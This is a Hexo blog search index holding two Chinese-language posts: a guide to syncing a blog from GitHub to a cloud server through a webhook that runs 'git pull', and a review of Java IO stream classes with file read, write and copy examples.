<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>搭建博客，利用Webhook自动更新</title>
    <url>//post/Hexo%E5%90%8C%E6%AD%A5%E6%9C%8D%E5%8A%A1%E5%99%A8.html</url>
    <content><![CDATA[<h1 id="Hexo-d-推送至服务器"><a href="#Hexo-d-推送至服务器" class="headerlink" title="Hexo d 推送至服务器"></a>Hexo d 推送至服务器</h1><p>​    前段时间利用Hexo搭建博客，并配合GitHub page进行页面显示，一切都很美妙，但有一个问题就是访问速度太慢，后面我希望将博客迁移到腾讯云中，之后就从服务器访问了。现在关于Hexo搭建基本博客的帖子已经很详细了，所以我会放一些我参考的链接，主要介绍如何从本地将文件同步到自己的服务器中。</p>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="Hexo博客搭建"><a href="#Hexo博客搭建" class="headerlink" title="Hexo博客搭建"></a>Hexo博客搭建</h3><p>三水同学的笔记：<a href="https://sanshui.vip/2022/08/10/indexday1/">https://sanshui.vip/2022/08/10/indexday1/</a>  （这里操作完，基本上就是博客雏形和Github page的显示）</p>
<h3 id="Butterfly主题"><a href="#Butterfly主题" class="headerlink" title="Butterfly主题"></a>Butterfly主题</h3><p>有了基本的博客雏形，但样式比较单一，这时候就可以利用现有的Hexo主题，这里只列举了Butterfly，还有些其他主题，可以自行查找。</p>
<p>推荐教程：<a href="https://www.fomal.cc/posts/4aa2d85f.html">https://www.fomal.cc/posts/4aa2d85f.html</a>  （这里操作完，样子就会好看许多，剩下的就是页面的修改，按照自己的意愿）</p>
<h3 id="页面音乐播放"><a href="#页面音乐播放" class="headerlink" title="页面音乐播放"></a>页面音乐播放</h3><p>我当时觉得博客加点儿音乐很有感觉，就捣鼓了些。</p>
<p>推荐教程：<a href="https://blog.csdn.net/qq_41467882/article/details/124734598">https://blog.csdn.net/qq_41467882/article/details/124734598</a></p>
<h2 id="博客同步"><a href="#博客同步" class="headerlink" title="博客同步"></a>博客同步</h2><p>前面的步骤里，只有Hexo博客搭建是必须的，另外两个都是为了美化，那我们先说如何从本地同步到Github page。</p>
<ol>
<li><code>hexo g</code> : 生成静态页面</li>
<li><code>hexo d</code> : hexo帮你部署，这里需要在_config.yml中配置地址即可，上面的教程有讲</li>
</ol>
<p>我之前遇到个问题，以为<code>hexo g</code>只用生成一次即可，后面修改完直接<code>hexo d</code>,实际上需要每次都要执行这两步，因为需要根据你修改的文章，生成新的静态页面，再上传。这里我嫌麻烦在<code>package.json</code>中写了新的选项来一次执行两步：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token string-property property">"scripts"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">// 这里以后就可以用 yarn upload 来执行两步</span>
  <span class="token string-property property">"upload"</span><span class="token operator">:</span> <span class="token string">"hexo generate &amp;&amp; hexo deploy"</span><span class="token punctuation">,</span>
  <span class="token string-property property">"build"</span><span class="token operator">:</span> <span class="token string">"hexo generate"</span><span class="token punctuation">,</span>
  <span class="token string-property property">"clean"</span><span class="token operator">:</span> <span class="token string">"hexo clean"</span><span class="token punctuation">,</span>
  <span class="token string-property property">"deploy"</span><span class="token operator">:</span> <span class="token string">"hexo deploy"</span><span class="token punctuation">,</span>
  <span class="token string-property property">"server"</span><span class="token operator">:</span> <span class="token string">"hexo server"</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>​    说完上面的了，你的博客就已经可以通过本地修改，通过到Github page中，但有些问题：</p>
<ol>
<li>同步上去后，Github page显示会有延迟</li>
<li>普通用户会加载的很慢，影响体验</li>
</ol>
<p>​    所以这里我尝试着迁移到自己的服务器中，以后直接通过Nginx访问服务器的静态博客页面，这里就牵扯到了购买服务器和域名（非必要），服务器没必要买很大的，因为只是简单的做博客效果，一般最小的轻量级服务器都可以。域名的话就是访问方便， 除非你乐意给别人发IP地址访问。这里都是比较简单的操作，直接去阿里云，腾讯云或者其他的厂商官网查看。</p>
<blockquote>
<p>到这里我假设你已经可以通过IP地址/域名访问到Nginx了。那我们如何进行数据迁移呢？</p>
</blockquote>
<p>​    最初我在想有没有插件可以直接通过<code>hexo d</code>直接部署到服务器指定位置中，确实有，但是我一直显示连接异常，后选择其他方式。也就是通过<code>github</code>的<code>WebHooks</code>功能。</p>
<p>​    大致思路为： <code>hexo d</code> 推送代码到<code>github</code>仓库，当<code>WebHooks</code>监测到有pull事件，将发送一条命令通知服务器，然后服务器触发脚本，拉取最新<code>git</code>代码。</p>
<p><img src="../../typora-user-images/image-20221128112850056.png" alt="image-20221128112850056"></p>
<ol>
<li>下载go  : <code>yum install -y golang </code></li>
<li>设置代理 : <code>go env -w GOPROXY=[https://goproxy.cn](https://goproxy.cn/),direct</code>  否则用go访问会老超时</li>
<li>查看go环境，看是否代理修改了 : <code>go env</code></li>
<li>安装WebHooks : <code>go get github.com/adnanh/webhook</code></li>
<li>编写shell脚本，主要作用就是拉取<code>git</code>仓库代码，如果你前面已经在服务器自己博客文件目录中<code>git clone</code>，克隆Github文件了，这里之后就可以直接用<code>git pull</code>了</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>

<span class="token builtin class-name">cd</span> /home/blog/GMaya   <span class="token comment"># 这里就是你自己打算存放博客的目录，可以自己定义</span>
<span class="token function">git</span> pull
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<ol start="6">
<li>编写<code>hooks.json</code>文件，就放在上一个文件下面就行</li>
</ol>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">[</span>
  <span class="token punctuation">&#123;</span>
    <span class="token string-property property">"id"</span><span class="token operator">:</span> <span class="token string">"随便自定义"</span><span class="token punctuation">,</span>
    <span class="token string-property property">"execute-command"</span><span class="token operator">:</span> <span class="token string">"webhook.sh"</span><span class="token punctuation">,</span> # 这里是你脚本的名字，就是上面的文件
    <span class="token string-property property">"command-working-directory"</span><span class="token operator">:</span> <span class="token string">"/home/hook"</span> # 这里是你脚本存放的地址
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol start="7">
<li>后台启动</li>
</ol>
<p><code>nohup /root/go/bin/webhook -hooks /上面定义的地址/hooks.json -verbose &amp;</code></p>
<ol start="8">
<li>查看日志</li>
</ol>
<p><code>tail -f nohup.out</code></p>
<p>正常显示：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>webhook<span class="token punctuation">]</span> <span class="token number">2021</span>/01/30 00:10:53 version <span class="token number">2.8</span>.0 starting
<span class="token punctuation">[</span>webhook<span class="token punctuation">]</span> <span class="token number">2021</span>/01/30 00:10:53 setting up os signal watcher
<span class="token punctuation">[</span>webhook<span class="token punctuation">]</span> <span class="token number">2021</span>/01/30 00:10:53 attempting to load hooks from /home/hook/hooks.json
<span class="token punctuation">[</span>webhook<span class="token punctuation">]</span> <span class="token number">2021</span>/01/30 00:10:53 found <span class="token number">1</span> hook<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token function">file</span>
<span class="token punctuation">[</span>webhook<span class="token punctuation">]</span> <span class="token number">2021</span>/01/30 00:10:53 	loaded: gmaya-hooks
<span class="token punctuation">[</span>webhook<span class="token punctuation">]</span> <span class="token number">2021</span>/01/30 00:10:53 serving hooks on http://0.0.0.0:9000/hooks/<span class="token punctuation">&#123;</span>id<span class="token punctuation">&#125;</span>
<span class="token punctuation">[</span>webhook<span class="token punctuation">]</span> <span class="token number">2021</span>/01/30 00:10:53 os signal watcher ready<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    注意：这里可以看到是根据9000端口通信的，所以一方面需要在服务器打开防护墙端口，一方面在你的服务器厂商那里打开防火墙或者什么安全设置。这里我用的腾讯云，直接在轻量服务器里加入9000端口的设置即可。</p>
<p>​    现在你的服务器就已经监听Github了，但Github还不知道你的服务器。</p>
<ol start="9">
<li>github上配置钩子</li>
</ol>
<p><img src="../../typora-user-images/image-20221128114311505.png" alt="image-20221128114311505"></p>
<p>填入Payload URL：<code>http://ip:9000/hooks/上面你自己定义的ID，在hooks.json</code></p>
<p>添加好后，就可以直接从本地同步到Github上，当Github上发生修改，服务器就会被触发执行脚本，拉取最新的代码。</p>
]]></content>
      <tags>
        <tag>博客搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>IO流复习</title>
    <url>//post/Java/IO%E6%B5%81.html</url>
    <content><![CDATA[<p>今天面试的时候问了一道IO流的题，鉴于之前在java基础篇的时候学过一遍，后再无使用和复习，就再跟着韩顺平老师的课件复习一遍。</p>
<h1 id="IO流"><a href="#IO流" class="headerlink" title="IO流"></a>IO流</h1><h2 id="IO流是什么？"><a href="#IO流是什么？" class="headerlink" title="IO流是什么？"></a>IO流是什么？</h2><p>当我们使用程序读取或修改本地文件时， 文件是以流的形式加载在内存中的。</p>
<ol>
<li>InputStream:输入流，从数据源加载至内存。</li>
<li>OutputStream:输出流，从存在中加载至目的地。</li>
</ol>
<p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8heh5hdrcj30jh045dg2.jpg" alt="image-20220902174637579"></p>
<h2 id="IO流有哪些分类"><a href="#IO流有哪些分类" class="headerlink" title="IO流有哪些分类"></a>IO流有哪些分类</h2><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8heh5td93j30tz0bywh6.jpg" alt="image-20220902174807812"></p>
<blockquote>
<p> 输入流，输出流是最宽泛的概念，也是我们上面讲的概念。那为什么还需要分成字节流，字符流，节点流，处理流呢？</p>
</blockquote>
<p>字节我们都知道：byte，是一个二进制单位，而我们的文件可以是txt(存储字符的),png(存储图片的),mp3(存储音频的),mp4(存储视频的)，但传输的时候我们都将其转化为二进制，因为计算机只能识别二进制，也就是字节。所以字节流的意思就是说：将该文件以字节为单位进行读取，可以一个字节一个字节读取，或者一段字节数组进行重复读取。这样不管是什么文件都可以进行传输了。</p>
<p>那为啥还需要字符流呢？这是已因为字节流是直接作用于文件的，而字符流使用了缓冲区，先将数据写入缓冲区进行读写操作，当输出流close或者flush时，才会把内容写入目的地。一般我们在操作文本内容时，使用字符流会更好一些，而图片，视频如果使用字符流，可能导致文件损坏。</p>
<p>节点流代表的是我们实际操作数据的流，相比包装流会更贴近底层一些，也就是我们使用FileInputStream,FileOutputStream等，而包装流是封装在节点流之上，用来加入缓存，封装接口，进行性能优化等。相当于节点流是mybatis，包装流就是mybatis-plus。</p>
<p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8heh68926j30h10g3dgh.jpg" alt="image-20220903100526143"></p>
<h2 id="具体使用（这里我只引用常用的）："><a href="#具体使用（这里我只引用常用的）：" class="headerlink" title="具体使用（这里我只引用常用的）："></a>具体使用（这里我只引用常用的）：</h2><h3 id="FileInputStream-节点流，字节流"><a href="#FileInputStream-节点流，字节流" class="headerlink" title="FileInputStream(节点流，字节流)"></a>FileInputStream(节点流，字节流)</h3><blockquote>
<p>请使用 FileInputStream 读取 hello.txt 文件，并将文件内容显示到控制台</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">fileInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
        <span class="token class-name">FileInputStream</span> fileInputStream <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> readLength <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span><span class="token punctuation">&#123;</span>
            fileInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"/Users/qinsicheng/IdeaProjects/IOStream/com/qinsicheng/hello.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>readLength <span class="token operator">=</span> fileInputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>bytes<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>readLength<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"哪里出现问题了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>
            fileInputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="FileOutputStream-节点流，字节流"><a href="#FileOutputStream-节点流，字节流" class="headerlink" title="FileOutputStream(节点流，字节流)"></a>FileOutputStream(节点流，字节流)</h3><blockquote>
<p>请使用  FileOutputStream    在 hello.txt 文件，中写入  “hello，world”,   如果文件不存在，会创建<br>文件(注意：前提是目录已经存在.)</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">fileOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
    <span class="token class-name">File</span> file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"/Users/qinsicheng/IdeaProjects/IOStream/com/qinsicheng/hello.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>file<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        file<span class="token punctuation">.</span><span class="token function">createNewFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">// 这里构造器如果加true，表示追加模式，如果不写，默认是覆盖原来内容</span>
    <span class="token class-name">FileOutputStream</span> fileOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token string">"hello，world---"</span><span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        fileOutputStream<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>
        fileOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>图片文件的拷贝</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">fileCopy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
    <span class="token class-name">FileInputStream</span> fileInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"/Users/qinsicheng/IdeaProjects/IOStream/com/qinsicheng/wallhaven.png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">FileOutputStream</span> fileOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"/Users/qinsicheng/IdeaProjects/IOStream/com/qinsicheng/wallhaven_.png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> readLen <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>readLen <span class="token operator">=</span> fileInputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            fileOutputStream<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>bytes<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>readLen<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>
        fileInputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        fileOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="FileReader-节点流，字符流"><a href="#FileReader-节点流，字符流" class="headerlink" title="FileReader(节点流，字符流)"></a>FileReader(节点流，字符流)</h3><blockquote>
<p>使用  FileReader   从    story.txt   读取内容，并显示</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">fileReader</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">FileReader</span> fileReader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileReader</span><span class="token punctuation">(</span><span class="token string">"/Users/qinsicheng/IdeaProjects/IOStream/com/qinsicheng/hello.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> readLen <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> chars <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>readLen <span class="token operator">=</span> fileReader<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>chars<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>chars<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>readLen<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>
        fileReader<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="FileWriter-节点流，字符流"><a href="#FileWriter-节点流，字符流" class="headerlink" title="FileWriter(节点流，字符流)"></a>FileWriter(节点流，字符流)</h3><blockquote>
<p>使用 FileWriter   将   “风雨之后，定见彩虹”    写入到   note.txt    文件中,    注意细节.</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">@Test
public void fileWriter() throws IOException &#123;
    &#x2F;&#x2F; 使用 FileWriter   将   “风雨之后，定见彩虹”    写入到   note.txt    文件中,    注意细节.
    FileWriter fileWriter &#x3D; new FileWriter(&quot;&#x2F;Users&#x2F;qinsicheng&#x2F;IdeaProjects&#x2F;IOStream&#x2F;com&#x2F;qinsicheng&#x2F;hello.txt&quot;, true);
    try &#123;
        fileWriter.write(&quot;风雨之后，定见彩虹&quot;);
    &#125; finally &#123;
        &#x2F;&#x2F; 一定要关闭流 ，数据才会写入到文件中，或者使用fileWriter.flush();
        fileWriter.close();
    &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="BufferReader-包装流，字符流"><a href="#BufferReader-包装流，字符流" class="headerlink" title="BufferReader(包装流，字符流)"></a>BufferReader(包装流，字符流)</h3><blockquote>
<p>使用BufferReader读取文件，并打印到控制台</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">@Test
public void bufferedReader() throws IOException &#123;
    BufferedReader bufferedReader &#x3D; new BufferedReader(new FileReader(&quot;&#x2F;Users&#x2F;qinsicheng&#x2F;IdeaProjects&#x2F;IOStream&#x2F;com&#x2F;qinsicheng&#x2F;hello.txt&quot;));
    String readLen;
    try &#123;
        &#x2F;&#x2F; readLine() 按照行读取，效率高
        while ((readLen &#x3D; bufferedReader.readLine()) !&#x3D; null) &#123;
            System.out.println(readLen);
        &#125;
    &#125; catch (IOException e) &#123;
        throw new RuntimeException(e);
    &#125; finally &#123;
        &#x2F;&#x2F; 这里包装流关闭时，节点流底层自动关闭了
        bufferedReader.close();
    &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="BufferWriter-包装流，字符流"><a href="#BufferWriter-包装流，字符流" class="headerlink" title="BufferWriter(包装流，字符流)"></a>BufferWriter(包装流，字符流)</h3><blockquote>
<p>bufferWriter 写 文件</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">bufferWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">BufferedWriter</span> bufferedWriter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedWriter</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileWriter</span><span class="token punctuation">(</span><span class="token string">"/Users/qinsicheng/IdeaProjects/IOStream/com/qinsicheng/hello.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
        bufferedWriter<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 换行</span>
        bufferedWriter<span class="token punctuation">.</span><span class="token function">newLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        bufferedWriter<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"world"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>
        bufferedWriter<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>bufferReader，bufferedWriter 拷贝文件</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">public void fileCopyByBuffered() throws IOException &#123;
    BufferedReader bufferedReader &#x3D; new BufferedReader(new FileReader(&quot;&#x2F;Users&#x2F;qinsicheng&#x2F;IdeaProjects&#x2F;IOStream&#x2F;com&#x2F;qinsicheng&#x2F;hello.txt&quot;));
    BufferedWriter bufferedWriter &#x3D; new BufferedWriter(new FileWriter(&quot;&#x2F;Users&#x2F;qinsicheng&#x2F;IdeaProjects&#x2F;IOStream&#x2F;com&#x2F;qinsicheng&#x2F;hello_.txt&quot;));
    String readLen;
    try &#123;
        &#x2F;&#x2F; 注意这里的bufferedReader.readLine()为换行符时，默认返回的是空字符，所以导致原本换行的地方，现在直接拼接了
        while ((readLen &#x3D; bufferedReader.readLine()) !&#x3D; null) &#123;
            if (&quot;&quot;.equals(readLen)) &#123;
                &#x2F;&#x2F; 这样就能保证正常输出了，还有一点比方说：\n\n\n  实际上中间只空了两行
                readLen+&#x3D;&quot;\n&quot;;
            &#125;
            bufferedWriter.write(readLen);
        &#125;
    &#125; finally &#123;
        bufferedWriter.close();
        bufferedReader.close();
    &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="BufferInputStream-包装流，字节流"><a href="#BufferInputStream-包装流，字节流" class="headerlink" title="BufferInputStream(包装流，字节流)"></a>BufferInputStream(包装流，字节流)</h3><h3 id="BufferOutputStream-包装流，字节流"><a href="#BufferOutputStream-包装流，字节流" class="headerlink" title="BufferOutputStream(包装流，字节流)"></a>BufferOutputStream(包装流，字节流)</h3><blockquote>
<p>BufferInputStream,BufferOutputStream拷贝文件</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">public void fileCopyByBufferedStream() throws IOException &#123;
    BufferedInputStream bufferedInputStream &#x3D; new BufferedInputStream(new FileInputStream(&quot;&#x2F;Users&#x2F;qinsicheng&#x2F;IdeaProjects&#x2F;IOStream&#x2F;com&#x2F;qinsicheng&#x2F;wallhaven.png&quot;));
    BufferedOutputStream bufferedOutputStream &#x3D; new BufferedOutputStream(new FileOutputStream(&quot;&#x2F;Users&#x2F;qinsicheng&#x2F;IdeaProjects&#x2F;IOStream&#x2F;com&#x2F;qinsicheng&#x2F;wallhaven__.png&quot;));
    byte[] bytes &#x3D; new byte[1024];
    int readLen &#x3D; 0;
    try &#123;
        while ((readLen &#x3D; bufferedInputStream.read(bytes)) !&#x3D; -1) &#123;
            bufferedOutputStream.write(bytes,0,readLen);
        &#125;
    &#125; finally &#123;
        bufferedInputStream.close();
        bufferedOutputStream.close();
    &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

